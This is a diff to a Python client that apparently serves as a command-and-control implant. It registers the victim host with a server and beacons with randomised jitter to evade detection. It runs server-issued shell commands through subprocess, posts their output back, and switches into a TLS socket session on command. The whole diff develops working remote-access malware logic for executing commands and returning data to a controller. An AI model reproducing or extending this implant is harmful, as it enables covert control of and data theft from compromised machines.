@@ -21,6 +21,7 @@ import pwd
 import grp
 import threading
 import json
+import random
 import http.client
 import urllib.parse
 from typing import Tuple
@@ -29,8 +30,8 @@ from time import sleep
 from datetime import datetime
 
 
-address = "127.0.0.1", 80
-
+address = "127.0.0.1", 8080
+sessionaddress = "127.0.0.1", 2000
 
 class Client:
     """Class handles all client side funtionality"""
@@ -51,7 +52,7 @@ class Client:
         """
         while True:
             try:
-                ssl_sock.connect(address)
+                ssl_sock.connect(sessionaddress)
                 received_data = self.receive_data(ssl_sock)
                 port = (ssl_sock.getsockname()[1])
                 self.authentication((received_data + str(port))[::-1])
@@ -98,6 +99,8 @@ class Client:
             if deco_data == "shutdown":
                 ssl_sock.close()
                 sys.exit(1)
+            if deco_data == "beacon":
+                break
             if deco_data != "":
                 data = (f'self.{deco_data}()')
             try:
@@ -533,16 +536,28 @@ processor = {platform.processor()}"""))
         response = conn.getresponse()
         data = response.read().decode()
         conn.close()
-
+        return response.status, data
+    
+    def post_request(self, url: str, body: dict) -> Tuple[int, str]:
+        parsed_url = urllib.parse.urlparse(url)
+        headers = {"Content-type": "application/json"}
+        conn = http.client.HTTPConnection(parsed_url.netloc)
+        json_data = json.dumps(body)
+        # Include query parameters in the request
+        path_with_params = parsed_url.path + "?" + parsed_url.query
+        conn.request("POST", path_with_params, body=json_data, headers=headers)
+        response = conn.getresponse()
+        data = response.read().decode()
+        conn.close()
         return response.status, data
 
-    def httpConnection(self) -> Tuple[int, str]:
+    def httpConnection(self) -> Tuple[int, str, int]:
         """beacon to the server"""
         r = self.get_request(f"http://{address[0]}:{address[1]}/connection?name={socket.gethostname()}&os={platform.system()}&address={socket.gethostbyname(socket.gethostname())}")
         print(r)
         if r[0] == 200:
             data = json.loads(r[1])
-            return data['timer'], data['uuid']
+            return data['timer'], data['uuid'], data['jitter']
         else:
             raise Exception(f"Failed to connect to server: {r[0]} {r[1]}")
 
@@ -551,7 +566,6 @@ processor = {platform.processor()}"""))
         while True:
             url = f"http://{address[0]}:{address[1]}/beacon?id={id}"
             r = self.get_request(url)
-            print(r)
             data = {}
             try:
                 data = json.loads(r[1])
@@ -561,28 +575,34 @@ processor = {platform.processor()}"""))
                 command = data["command"]
                 cid = data["command_uuid"]
                 print(f"Executing command: {command}")
+                if command == "session":
+                    break
                 output = subprocess.getoutput(command)
-                url = f"http://{address[0]}:{address[1]}/response?id={id}&cid={cid}&output={output}"
-                r = self.get_request(url)
-                print(r)
+                url = f"http://{address[0]}:{address[1]}/response?id={id}&cid={cid}"
+                data = {"output": output}
+                r = self.post_request(url, data)
             if "timer" in data:
                 timer = data["timer"]
-                print(f"Sleeping for {timer} seconds")
-            sleep(int(timer))
+            try :
+                sleep(int(timer + random.randint(-jitter, jitter)))
+            except ValueError:
+                sleep(timer)
 
 
 
 if __name__ == '__main__':
+    timer = 20
     try:
         client = Client()  # calls the client class
         while True:
-            # client.socketinitilsation()  # starts socket
-            # client.connection()
-            timer, id = client.httpConnection()
+            timer, id, jitter = client.httpConnection()
             client.beacon(timer, id)
-            # client.sendhostname()  # sends hostname
-            # client.send_data(ssl_sock, "Python")
-            # client.check_listener()  # checks listner
-            # client.serverhandler()  # starts server handler
+            print("Entering session")
+            client.socketinitilsation()  # starts socket
+            client.connection()
+            client.sendhostname()  # sends hostname
+            client.send_data(ssl_sock, "Python")
+            client.check_listener()  # checks listner
+            client.serverhandler()  # starts server handler
     except KeyboardInterrupt:
         print("exit")
